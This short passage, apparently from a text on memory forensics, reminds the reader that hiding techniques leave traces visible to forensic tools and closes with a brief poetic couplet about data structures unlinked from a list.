knowledge. Every technique you deploy will be visible to these tools
in a forensic scenario. Know your trace before you leave it.

---

— data structures SEVERED from the list, still breathing,
the census taker counts what the architecture chooses to show

